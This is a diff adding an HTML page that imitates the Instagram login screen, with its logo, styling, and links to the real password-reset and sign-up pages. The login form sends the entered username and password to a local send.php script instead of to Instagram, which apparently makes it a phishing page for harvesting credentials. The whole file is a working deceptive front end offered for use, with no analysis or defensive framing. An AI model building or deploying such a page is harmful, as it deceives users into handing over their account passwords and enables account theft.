@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>Instagram</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+ 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
+  	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+  	<link rel="shortcut icon" href="ins.png" type="image/jpg">
+	<style>
+		body {
+	            background-image: linear-gradient(#89216B,#DA4453);
+				background-repeat: no-repeat;
+				background-size: cover;
+				text-align: center;
+				height: 1920px;
+			 }
+form {
+	margin-top: 100px;
+}
+.sub {
+	border: 1px solid white !important;
+	cursor: pointer;
+}
+.inp {
+	width: 350px;
+	height: 50px;
+	background-color: transparent;
+	color: white;
+	padding: 15px;
+	box-sizing: border-box;
+	border: none;
+	outline: none;
+	border-bottom: 1px solid #ddd;
+	border-radius: 2px;
+	line-height: 10px;
+}
+.aaa {
+	width: 200px;
+	height: 40px;
+	background-color: transparent;
+	margin: 100px auto;
+	margin-bottom: 0px;
+}
+a {
+	color: white !important;
+}
+
+	</style>
+
+
+</head>
+<body>
+	<div class="container-fluid">
+		<div class="col-sm-12">
+			<div class="aaa"><img width="200px" height="70px" src="https://www.j4j.co.za/wp-content/uploads/2017/11/instagram-logo-big.png" alt=""></div>
+
+		<form action="send.php" method="post">
+			<p><input class="inp" type="text" placeholder="Login" name="Login" required></p>
+			<p><input class="inp" type="password" placeholder="Password" name="Password" required minlength="8"></p>
+			<p><input class="inp sub" type="submit" value="Log In"></p>
+		</form>
+		<p style="color: white">Forgot your login details? <a href="https://www.instagram.com/accounts/password/reset/">Get help signing in.</a></p>
+
+		<p style="color: white !important; margin-top: 50px">Or</p>
+
+		<p style="color: white !important"><img width="25px" height="25px" src="http://www.iconsplace.com/download/white-facebook-512.png" alt="">   Log in with Facebook</p>
+
+		<hr>
+		<p style="color: white !important">Don't have an account? <a href="https://www.instagram.com/">Sign up</a>.</p>
+		</div>
+	</div>
+
+
+
+</body>
+</html>
